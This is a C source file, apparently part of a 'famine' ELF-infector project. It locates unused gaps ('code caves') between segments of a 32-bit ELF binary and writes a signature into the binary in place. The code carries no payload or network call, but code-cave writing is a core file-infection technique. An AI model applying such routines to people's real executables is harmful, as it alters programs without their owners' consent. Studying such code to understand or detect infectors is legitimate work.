#include "famine.h"

#include <elf.h> // Elf32_Phdr
#include <stdbool.h> // bool, false, true
#include <stdint.h> // int32_t, uintN_t
#include <string.h> // memcpy()

typedef struct s_range {
	uint32_t start;
	uint32_t end;
} t_range;

static bool check_segment_bounds(t_file *file, Elf32_Phdr *phdr)
{
	if (phdr->p_offset > file->size)
		return (false);
	if (phdr->p_filesz > file->size - phdr->p_offset)
		return (false);
	return (true);
}

static uint16_t get_segments_ranges(t_file *file, t_elf32 *elf32,
                                    t_range *ranges)
{
	uint16_t count;

	count = 0;
	for (uint32_t i = 0; i < elf32->ehdr->e_phnum; i++) {
		if (!check_segment_bounds(file, &elf32->phdr[i])
		    || elf32->phdr[i].p_filesz == 0)
			continue ;

		ranges[count].start = elf32->phdr[i].p_offset;
		ranges[count].end = ranges[count].start
		                  + elf32->phdr[i].p_filesz;
		count++;
	}
	return (count);
}

static void sort_ranges(t_range *ranges, uint16_t count)
{
	t_range key;
	int32_t j;

	for (uint16_t i = 1; i < count; i++) {
		key = ranges[i];
		j = i - 1;
		while (j >= 0 && ranges[j].start > key.start) {
			ranges[j + 1] = ranges[j];
			j--;
		}
		ranges[j + 1] = key;
	}
}

static uint32_t find_code_cave(t_range *ranges, uint16_t count)
{
	uint32_t end;

	end = ranges[0].end;
	for (uint32_t i = 1; i < count; i++) {
		if (ranges[i].start > end
		    && ranges[i].start - end >= SIGNATURE_SIZE)
			return (end);
		if (ranges[i].end > end)
			end = ranges[i].end;
	}
	return (0);
}

int sign_elf32_cavity(t_file *file, t_elf32 *elf32)
{
	t_range ranges[elf32->ehdr->e_phnum];
	uint16_t count;
	uint32_t cave;

	count = get_segments_ranges(file, elf32, ranges);
	if (count < 2)
		return (1);

	sort_ranges(ranges, count);

	cave = find_code_cave(ranges, count);
	if (cave == 0)
		return (1);

	memcpy(file->map + cave, SIGNATURE, SIGNATURE_SIZE);
	return (0);
}
